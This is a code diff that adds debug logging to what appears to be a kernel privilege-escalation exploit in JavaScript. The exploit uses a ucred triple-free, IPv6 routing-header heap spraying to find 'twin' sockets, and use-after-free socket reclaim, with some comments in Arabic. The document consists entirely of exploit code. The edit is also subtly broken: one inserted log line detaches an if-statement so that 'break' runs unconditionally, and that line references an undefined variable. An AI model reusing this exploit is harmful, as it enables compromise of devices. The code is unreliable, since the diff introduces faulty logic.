@@ -777,6 +777,7 @@ function find_twins() {
   var spray_add = spray_rthdr.add(0x04);
   var leak_add = leak_rthdr.add(0x04);
   while (count < MAX_ROUNDS_TWIN) {
+    log('[TWINS] round ' + count);
     if (typeof debugging !== 'undefined' && debugging.info && debugging.info.memory && debugging.info.memory.available === 0) {
       zeroMemoryCount++;
       if (zeroMemoryCount >= 5) {
@@ -800,6 +801,8 @@ function find_twins() {
       get_rthdr(ipv6_socks[i], leak_rthdr, 8);
       val = read32(leak_add);
       j = val & 0xFFFF;
+      log('[TWINS] i=' + i + ' val=0x' + val.toString(16) + ' j=' + j);
+
       if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j && j >= 0 && j < ipv6_socks.length) {
         twins[0] = i;
         twins[1] = j;
@@ -809,6 +812,7 @@ function find_twins() {
     }
     count++;
   }
+  log('[TWINS] FAILED: no twins after ' + MAX_ROUNDS_TWIN + ' rounds');
   twins[0] = -1;
   twins[1] = -1;
   return false;
@@ -1276,16 +1280,20 @@ var TRIPLEFREE_REFCOUNT_FIX_LOOPS = 16;
 var TRIPLEFREE_REFCOUNT_MAX_WAIT = 2000;
 function trigger_ucred_triplefree() {
   var end = false;
+  var main_count = 0;
+  log('[TRIPLE] start, max iters = ' + TRIPLEFREE_ITERATIONS);
 
   // msgIov كما في الأصلي
   write64(msgIov.add(0x0), 1);
   write64(msgIov.add(0x8), 1);
-  var main_count = 0;
+  
   while (!end && main_count < TRIPLEFREE_ITERATIONS) {
     main_count++;
+    log('--- [TRIPLE] iteration ' + main_count + ' ---');
 
     // 1) dummy socket → register in netcontrol
     var dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0);
+    log('[TRIPLE] dummy_socket = ' + hex(dummy_socket));
     write32(nc_set_buf, Number(dummy_socket.and(0xFFFFFFFF)));
     netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_SET_QUEUE, nc_set_buf, 8);
     close(new BigInt(dummy_socket));
@@ -1295,6 +1303,7 @@ function trigger_ucred_triplefree() {
 
     // 3) reclaim fd → uaf_socket
     uaf_socket = Number(socket(AF_UNIX, SOCK_STREAM, 0));
+    log('[TRIPLE] uaf_socket = ' + hex(new BigInt(uaf_socket)));
 
     // 4) free previous ucred
     setuid(1);
@@ -1316,12 +1325,16 @@ function trigger_ucred_triplefree() {
 
     // 8) إيجاد التوأم
     end = find_twins();
+    log('[TRIPLE] find_twins() => ' + end + '  twins = [' + twins[0] + ', ' + twins[1] + ']');
+
     if (!end) {
       twins[0] = -1;
       twins[1] = -1;
       close(new BigInt(uaf_socket));
       continue;
     }
+    log('[TRIPLE] twins found: [' + twins[0] + ', ' + twins[1] + ']');
+
     // 9) free واحدة من التوأم
     free_rthdr(ipv6_socks[twins[1]]);
 
@@ -1339,10 +1352,13 @@ function trigger_ucred_triplefree() {
       // دلوقتي بس نقرأ refcount
       write32(leak_rthdr.add(0x04), 0);
       get_rthdr(ipv6_socks[twins[0]], leak_rthdr, 8);
-      if (read32(leak_rthdr) === 1) break;
+      if (read32(leak_rthdr) === 1) 
+      log('[TRIPLE] refcount check #' + count + ' => ' + ref);
+      break;
       count++;
     }
     if (count === TRIPLEFREE_REFCOUNT_MAX_WAIT) {
+      log('[TRIPLE] refcount never reached 1, aborting this attempt');
       twins[0] = -1;
       twins[1] = -1;
       close(new BigInt(uaf_socket));
@@ -1379,8 +1395,10 @@ function trigger_ucred_triplefree() {
     read(new BigInt(iov_sock_0), tmp, 1);
   }
   if (main_count === TRIPLEFREE_ITERATIONS) {
+    log('[TRIPLE] FAILED: reached max iterations with no success');
     return false;
   }
+  log('[TRIPLE] SUCCESS');
   return true;
 }
 function leak_kqueue() {
